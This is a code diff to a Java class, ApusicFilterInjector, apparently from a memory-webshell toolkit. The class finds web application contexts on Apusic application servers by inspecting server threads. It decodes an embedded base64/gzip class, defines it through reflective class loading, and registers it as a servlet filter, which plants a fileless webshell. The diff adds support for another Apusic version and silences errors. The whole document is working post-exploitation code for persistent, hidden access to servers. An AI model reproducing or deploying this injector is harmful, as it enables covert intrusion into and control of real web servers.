@@ -3,11 +3,13 @@ package com.reajason.javaweb.memshell.injector.apusic;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
@@ -17,15 +19,22 @@ import java.util.zip.GZIPInputStream;
  */
 public class ApusicFilterInjector {
 
+    String msg = "";
+
     public ApusicFilterInjector() {
         try {
             List<Object> contexts = getContext();
+            msg += "contexts size: " + contexts.size() + "\n";
             for (Object context : contexts) {
-                Object filter = getShell(context);
-                inject(context, filter);
+                Object shell = getShell(context);
+                boolean inject = inject(context, shell);
+                msg += "context: " + getFieldValue(context, "contextRoot") + (inject ? " ok" : " already") + "\n";
             }
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Throwable e) {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            PrintStream printStream = new PrintStream(outputStream);
+            e.printStackTrace(printStream);
+            msg += outputStream.toString();
         }
     }
 
@@ -51,39 +60,57 @@ public class ApusicFilterInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("HouseKeeper")) {
-                contexts.add(getFieldValue(getFieldValue(thread, "this$0"), "container"));
+                // Apusic 9.0 SPX
+                Object sessionManager = getFieldValue(thread, "this$0");
+                contexts.add(getFieldValue(sessionManager, "container"));
+            } else if (thread.getName().contains("HTTPSession")) {
+                // Apusic 9.0.1
+                Object sessionManager = getFieldValue(thread, "this$0");
+                Map<?, ?> contextMap = ((Map<?, ?>) getFieldValue(getFieldValue(sessionManager, "vhost"), "contexts"));
+                contexts.addAll(contextMap.values());
             }
         }
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+    private Object getShell(Object context) throws Exception {
+        // WebApp 类加载器，ServletContext 使用这个进行组件的类加载
+        ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
+        ClassLoader defineLoader;
+        Object obj;
         try {
-            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
-        } catch (Exception e) {
-            return ((ClassLoader) getFieldValue(context, "loader"));
+            // Apusic 9.0 SPX，优先从当前 loader 进行加载
+            defineShell(loader);
+            // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
+            obj = loader.loadClass(getClassName()).newInstance();
+            defineLoader = loader;
+        } catch (ClassNotFoundException e) {
+            // Apusic 9.0.1，委托给 jspLoader 进行加载，因此直接往 loader 里面 define 会 ClassNotFound
+            ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
+            defineShell(internalLoader);
+            // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
+            obj = loader.loadClass(getClassName()).newInstance();
+            defineLoader = internalLoader;
         }
+        msg += defineLoader + " loaded \n";
+        return obj;
     }
 
     @SuppressWarnings("all")
-    private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = getWebAppClassLoader(context);
+    private void defineShell(ClassLoader classLoader) throws Exception {
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+        } catch (Throwable ignored) {
         }
     }
 
-    public void inject(Object context, Object filter) throws Exception {
+    public boolean inject(Object context, Object filter) throws Exception {
         Object webModule = getFieldValue(context, "webapp");
         if (invokeMethod(webModule, "getFilter", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
-            System.out.println("filter already injected");
-            return;
+            return false;
         }
         // addFilterMapping
         Class<?> filterMappingClass = context.getClass().getClassLoader().loadClass("com.apusic.deploy.runtime.FilterMapping");
@@ -100,7 +127,12 @@ public class ApusicFilterInjector {
         Class<?> filterMappingArrayClass = Array.newInstance(filterMappingClass, 0).getClass();
         Object filterMapper = getFieldValue(context, "filterMapper");
         invokeMethod(filterMapper, "populate", new Class[]{filterMappingArrayClass}, new Object[]{allFilterMappings});
-        System.out.println("filter injected successful");
+        return true;
+    }
+
+    @Override
+    public String toString() {
+        return super.toString() + "\n" + msg;
     }
 
     @SuppressWarnings("all")
@@ -155,7 +187,7 @@ public class ApusicFilterInjector {
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException(fieldName);
+        throw new NoSuchFieldException(fieldName + " for " + obj.getClass().getName());
     }
 
     @SuppressWarnings("all")
